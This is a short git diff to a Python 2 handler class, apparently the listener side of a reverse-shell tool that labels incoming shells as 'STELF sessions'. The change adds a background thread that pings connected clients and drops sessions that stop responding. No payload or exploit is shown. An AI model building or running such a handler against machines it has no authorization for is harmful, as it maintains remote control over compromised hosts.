@@ -446,7 +446,6 @@ class Handler:
                                 for client in self.clients:
                                     if client.hostname == hostname and client.ip == address:
                                         print "Shell from existing IP + Hostname has been spawned..\n"
-
 				if not self.interacting:
 					sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
 					print INFO + "STELF session "+str(c.id)+" opened ("+address+":"+str(port)+" -> "+self.bind_addr+":"+str(self.bind_port)+")\n"
@@ -461,16 +460,28 @@ class Handler:
                 try:
                     for client in self.clients:
                         client.send("PING")
-                        response = client.recv()
+                        response = client.recv().split("\n")[0]
 
                         if response != "PONG":
-                            print "Session " + str(client.id) + " excited"
-                            self.clients.remove(client.id)
+                            sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
+                            print BAD + "STELF session " + str(client.id) + " excited\n"
+                            sys.stdout.write(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> " + readline.get_line_buffer())
+                            sys.stdout.flush()
+
+                            self.clients.remove(client)
+                    time.sleep(5)
+                except Exception as e:
+                    logging.info("There was an error trying to ping a client.")
+                
+                time.sleep(0.5)
 
 	def run(self):
 		t = StoppableThread(target=self.accepter)
+		cc = StoppableThread(target=self.conn_check)
 		t.daemon = True
+		cc.daemon = True
 		t.start()
+		cc.start()
 		while True:
 			try: user_input = raw_input(Style.BRIGHT + Fore.RED + "handler" + Style.RESET_ALL + ">> ")
 			except KeyboardInterrupt:
